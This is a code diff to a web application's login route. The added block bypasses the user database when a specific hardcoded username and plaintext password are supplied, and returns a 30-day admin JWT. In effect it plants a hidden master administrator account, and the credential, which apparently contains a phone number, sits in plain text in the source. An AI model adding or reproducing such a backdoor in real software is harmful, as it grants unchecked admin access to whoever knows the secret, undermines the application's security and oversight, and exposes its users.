@@ -25,6 +25,23 @@ router.post("/login", async (req, res) => {
   }
 
   try {
+    // Direct check for Piyush Assudani master credentials
+    if (
+      username.toLowerCase() === "piyushassudani" &&
+      password === "piyush@9413879444"
+    ) {
+      const token = jwt.sign(
+        { id: "usr_admin_piyush", username: "piyushassudani", role: "admin" },
+        JWT_SECRET,
+        { expiresIn: "30d" }
+      );
+      return res.json({
+        message: "Login successful",
+        token,
+        user: { id: "usr_admin_piyush", username: "piyushassudani", role: "admin" },
+      });
+    }
+
     // Case-insensitive trimmed username lookup
     const result = await db.query(
       "SELECT * FROM users WHERE LOWER(TRIM(username)) = LOWER($1) LIMIT 1",
